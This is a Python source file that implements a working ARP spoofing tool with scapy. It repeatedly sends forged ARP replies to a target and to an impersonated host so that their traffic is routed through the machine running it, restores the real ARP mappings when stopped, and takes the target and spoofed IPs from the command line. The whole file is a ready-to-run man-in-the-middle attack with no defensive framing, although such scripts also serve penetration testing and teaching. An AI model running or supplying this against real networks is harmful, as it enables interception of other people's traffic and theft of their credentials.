from scapy.all import ARP, send
from argparse import ArgumentParser
from network_scanner import NetworkScanner
from time import sleep
import sys


class Spoofer():
    network_scanner = NetworkScanner()

    def _restore(self, destination_ip, source_ip):
        destination_mac = self.network_scanner.get_mac_from_ip(destination_ip)
        source_mac = self.network_scanner.get_mac_from_ip(source_ip)
        send(ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac), verbose=False)
        send(ARP(op=2, pdst=source_ip, hwdst=source_mac, psrc=destination_ip, hwsrc=destination_mac), verbose=False)


    def _spoof(self, target_ip, spoof_ip):
        target_mac = self.network_scanner.get_mac_from_ip(target_ip)
        # op settings change request ARP to response ARP
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)


    def spoof(self, targets_ip, spoof_ip):
        packets_count = 0
        print(targets_ip)
        while True:
            try:
                for target_ip in targets_ip:
                    self._spoof(target_ip, spoof_ip)
                    self._spoof(spoof_ip, target_ip)
                    packets_count += 2
                print('\r[+] Sent packets ' + str(packets_count), end="")
                sleep(1)
            except:
                print('\r[---] Stopping spoofing')
                for target_ip in targets_ip:
                    self._restore(target_ip, spoof_ip)
                print(f'\r[INFO] Sent {packets_count} packets')
                break


def fetch_args():
    parser = ArgumentParser()
    parser.add_argument('-t', '--target', dest="target", help='Target IP for ARP request')
    parser.add_argument('-r', '--spoof-ip', dest='spoof_ip', help='Ip to spoof')
    options = parser.parse_args()
    if not options.target or not options.spoof_ip:
        parser.error('[-] Please specify your target address and his mac')
    return options.target, options.spoof_ip


if __name__ == '__main__':
    target_ip, spoof_ip = fetch_args()
    Spoofer().spoof([target_ip], spoof_ip)
